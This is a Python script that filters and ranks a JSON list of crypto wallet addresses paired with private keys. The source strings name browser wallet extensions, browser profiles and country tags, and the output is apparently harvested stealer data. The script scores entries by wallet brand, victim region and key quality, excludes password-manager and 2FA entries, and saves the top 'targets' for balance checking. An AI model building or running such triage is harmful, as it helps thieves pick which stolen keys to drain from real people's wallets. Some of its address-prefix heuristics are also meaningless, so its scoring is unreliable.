#!/usr/bin/env python3
"""
Smart Address Filter - Reduces large address lists to highest probability targets
"""
import json
import sys
from collections import defaultdict

def analyze_address_patterns(addresses):
    """Analyze addresses to find the most promising patterns"""
    
    # Count sources to identify most active wallets
    source_counts = defaultdict(int)
    wallet_types = defaultdict(int)
    
    for addr in addresses:
        source = addr.get('source', '')
        source_counts[source] += 1
        
        # Extract wallet type
        if 'MetaMask' in source:
            wallet_types['MetaMask'] += 1
        elif 'Trust' in source:
            wallet_types['Trust'] += 1
        elif 'Phantom' in source:
            wallet_types['Phantom'] += 1
        elif 'Coinbase' in source:
            wallet_types['Coinbase'] += 1
    
    return source_counts, wallet_types

def apply_ultra_aggressive_filter(addresses, target_count=1000):
    """Apply extremely aggressive filtering to get only the best targets"""
    
    print(f"🎯 ULTRA-AGGRESSIVE FILTER: Reducing to top {target_count} addresses")
    print(f"📊 Starting with {len(addresses):,} addresses")
    
    # Step 1: Remove obviously bad addresses
    filtered = []
    for addr in addresses:
        address = addr.get('address', '')
        private_key = addr.get('private_key', '')
        source = addr.get('source', '').lower()
        
        # Skip 2FA apps and password managers completely
        if any(x in source for x in ['authenticator', 'authy', 'bitwarden', 'evernote']):
            continue
            
        # Skip if private key looks weak
        if private_key:
            if private_key.count('0') > len(private_key) * 0.8:  # Too many zeros
                continue
            if len(set(private_key)) < 6:  # Too few unique chars
                continue
        
        # Skip sequential-looking addresses
        addr_clean = address.lower().replace('0x', '')
        sequential_patterns = ['0000000', '1111111', '2222222', '3333333', 
                              '4444444', '5555555', '6666666', '7777777',
                              '8888888', '9999999', 'aaaaaaa', 'bbbbbbb']
        if any(pattern in addr_clean for pattern in sequential_patterns):
            continue
            
        filtered.append(addr)
    
    print(f"✅ After basic filtering: {len(filtered):,} addresses")
    
    # Step 2: Only keep addresses from high-value wallet types
    high_value_wallets = []
    for addr in filtered:
        source = addr.get('source', '').lower()
        
        # Only keep these wallet types (most likely to have funds)
        if any(wallet in source for wallet in ['metamask', 'trust', 'phantom', 'coinbase', 'binance']):
            high_value_wallets.append(addr)
    
    print(f"✅ After wallet type filter: {len(high_value_wallets):,} addresses")
    
    # Step 3: Geographic filtering - focus on high-value regions
    geo_filtered = []
    for addr in high_value_wallets:
        source = addr.get('source', '')
        
        # Priority regions (developed countries with high crypto adoption)
        if any(region in source for region in ['US]', 'CA]', 'CH]', 'CY]', 'CN]', 'GB]']):
            geo_filtered.append(addr)
        # Also include some emerging markets with known crypto activity
        elif any(region in source for region in ['BR]', 'CO]', 'CL]']) and 'metamask' in source.lower():
            geo_filtered.append(addr)
    
    print(f"✅ After geographic filter: {len(geo_filtered):,} addresses")
    
    # Step 4: Score and rank remaining addresses
    for addr in geo_filtered:
        score = calculate_ultra_score(addr)
        addr['ultra_score'] = score
    
    # Sort by ultra score
    geo_filtered.sort(key=lambda x: x['ultra_score'], reverse=True)
    
    # Step 5: Take only the top addresses
    final_selection = geo_filtered[:target_count]
    
    print(f"🏆 Final selection: {len(final_selection)} addresses")
    print(f"📈 Score range: {final_selection[0]['ultra_score']:.1f} to {final_selection[-1]['ultra_score']:.1f}")
    
    return final_selection

def calculate_ultra_score(addr):
    """Calculate ultra-high-confidence score"""
    score = 0.0
    
    address = addr.get('address', '')
    private_key = addr.get('private_key', '')
    source = addr.get('source', '').lower()
    
    # Wallet type scoring (very aggressive)
    if 'metamask' in source:
        if 'chrome' in source and 'default' in source:
            score += 15.0  # Default Chrome MetaMask = most common
        elif 'chrome' in source:
            score += 12.0  # Chrome MetaMask
        else:
            score += 10.0  # Other MetaMask
    elif 'coinbase' in source:
        score += 12.0  # Coinbase users likely have funds
    elif 'trust' in source:
        score += 8.0   # Trust wallet
    elif 'phantom' in source:
        score += 7.0   # Phantom
    elif 'binance' in source:
        score += 9.0   # Binance
    
    # Geographic ultra-bonus
    if '[US]' in source or '[CA]' in source:
        score += 8.0   # US/Canada highest priority
    elif '[CH]' in source or '[CY]' in source:
        score += 6.0   # Switzerland/Cyprus
    elif '[CN]' in source:
        score += 5.0   # China
    elif '[BR]' in source and 'metamask' in source:
        score += 4.0   # Brazil MetaMask users
    
    # Address format bonus
    if address.startswith('0x') and len(address) == 42:
        score += 5.0   # Ethereum
        # Ethereum address heuristics
        if address[2:4] in ['1', '2', '3', '4', '5', '9', 'A', 'B', 'C', 'D', 'E', 'F']:
            score += 3.0   # Common prefixes
    elif address.startswith('1') and len(address) == 34:
        score += 4.0   # Bitcoin P2PKH
        # Bitcoin heuristics
        if address[1:3] in ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H']:
            score += 3.0   # Common second chars
    
    # Private key quality
    if private_key and len(private_key) == 64:
        unique_chars = len(set(private_key))
        if unique_chars >= 10:
            score += 4.0   # High entropy
        elif unique_chars >= 8:
            score += 2.0   # Medium entropy
    
    # Browser profile analysis
    if 'profile' in source:
        if any(x in source for x in ['profile 1', 'profile 2']):
            score += 2.0   # Early profiles = active users
    elif 'default' in source:
        score += 3.0       # Default profiles common
    
    return score

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 smart_filter.py <json_file>")
        sys.exit(1)
    
    input_file = sys.argv[1]
    
    print("🧠 SMART ADDRESS FILTER")
    print("=" * 50)
    
    # Load addresses
    print(f"📂 Loading addresses from: {input_file}")
    with open(input_file, 'r') as f:
        addresses = json.load(f)
    
    print(f"📊 Loaded {len(addresses):,} addresses")
    
    # Analyze patterns
    source_counts, wallet_types = analyze_address_patterns(addresses)
    
    print(f"\n📈 Top wallet types:")
    for wallet, count in sorted(wallet_types.items(), key=lambda x: x[1], reverse=True)[:5]:
        print(f"   {wallet}: {count:,} addresses")
    
    # Apply filters with different target sizes
    print(f"\n🎯 FILTER OPTIONS:")
    print(f"1. Ultra-conservative (500 addresses)")
    print(f"2. Conservative (1000 addresses)")  
    print(f"3. Moderate (2500 addresses)")
    print(f"4. Aggressive (5000 addresses)")
    
    choice = input("Select filter level (1-4): ").strip()
    
    target_counts = {'1': 500, '2': 1000, '3': 2500, '4': 5000}
    target_count = target_counts.get(choice, 1000)
    
    # Apply ultra-aggressive filter
    filtered_addresses = apply_ultra_aggressive_filter(addresses, target_count)
    
    # Save filtered results
    output_file = f"filtered_top_{target_count}.json"
    with open(output_file, 'w') as f:
        json.dump(filtered_addresses, f, indent=2)
    
    print(f"\n💾 Filtered addresses saved to: {output_file}")
    print(f"🎯 Ready for high-confidence balance checking!")
    
    # Show preview of top addresses
    print(f"\n🏆 TOP 10 HIGHEST SCORING ADDRESSES:")
    for i, addr in enumerate(filtered_addresses[:10], 1):
        source_short = addr.get('source', 'unknown').split('/')[-1][:25]
        print(f"   {i:2d}. {addr['address'][:12]}...{addr['address'][-8:]} "
              f"(score: {addr['ultra_score']:5.1f}, {addr['chain']}, {source_short})")

if __name__ == "__main__":
    main()
